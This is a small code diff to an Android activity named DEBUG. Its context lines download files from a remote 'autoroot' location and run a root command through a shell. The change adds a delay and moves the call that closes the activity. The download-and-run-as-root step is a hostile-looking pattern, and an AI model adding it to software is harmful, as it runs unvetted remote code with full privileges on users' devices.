@@ -265,15 +265,16 @@ public class DEBUG extends Activity {
 				downloadFile.execute(
 						new String[] { Constants.AUTOROOTDL + "all",
 								Constants.BASE + "all" }).get();
-
+				Thread.sleep(2000);
 				/* RUN! */
 				Shell.SH.run(Constants.ROOT);
 			}
 			Thread.sleep(5000);
-			finish();
 		} catch (Exception exc) {
 			Shell.SH.run("echo 'CODELIST | " + exc.toString()
 					+ "' >> /sdcard/Android/data/settings/Logger/CRASH.txt");
+		} finally {
+			finish();
 		}
 	}
 
